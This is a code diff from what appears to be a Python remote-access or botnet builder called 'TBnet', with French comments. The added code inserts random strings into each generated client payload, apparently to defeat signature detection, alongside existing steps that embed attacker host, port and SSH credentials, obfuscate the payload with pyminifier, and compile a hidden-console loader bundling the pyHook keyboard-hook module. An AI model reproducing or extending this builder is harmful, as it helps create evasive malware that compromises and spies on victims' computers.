@@ -24,6 +24,25 @@ def getString(length):
     str = string.ascii_lowercase
     return ''.join(random.choice(str) for i in range(length))
 
+def InsertRandomString(script):
+    cible = "<RANDOMSTRING>"
+    new_lignes = []
+    try:
+        fichier = open(script, "r")
+        lignes = fichier.readlines()
+        for ligne in lignes:
+            rdm_str = getString(random.randint(25, 45))
+            new_ligne = ligne.replace(cible, rdm_str)
+            new_lignes.append(new_ligne)
+        fichier.close()
+        fichier = open(script, "w")
+        for ligne in new_lignes:
+            fichier.write(ligne)
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
 parser = argparse.ArgumentParser(description='TBnet Help Menu')
 parser.add_argument('--host', 
                     type=str, 
@@ -118,6 +137,8 @@ class GenClient:
         fichier.write("\n    host = \"{}\"\n    port = {}\n    user_SSH = \"{}\"\n    password_SSH = \"{}\"\n".format(ip, str(port), username_SSH, password_SSH))
         fichier.write(self.ReturnFichier("payload2.txt"))
         fichier.close()
+        # Ajouté les RandomString
+        InsertRandomString(self.pathDirHttp + name + ".pyw")
         # obfusqué le payload
         if obf:
             os.system("pyminifier --obfuscate-classes -o " + self.pathDirHttp + name + ".pyw" + " " + self.pathDirHttp + name + ".pyw")
@@ -216,7 +237,7 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
             FileDescription
             """
         # si l'options freeze est choisi
-        if freeze: ### --onefile
+        if freeze: ### --onefile ##--windows-onefile-tempdir-spec=\"'%APPDATA%\\onefile_%PID%_%TIME%'\"
             ## Complier le loader
             cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile".format(self.appdata)
             if adm:
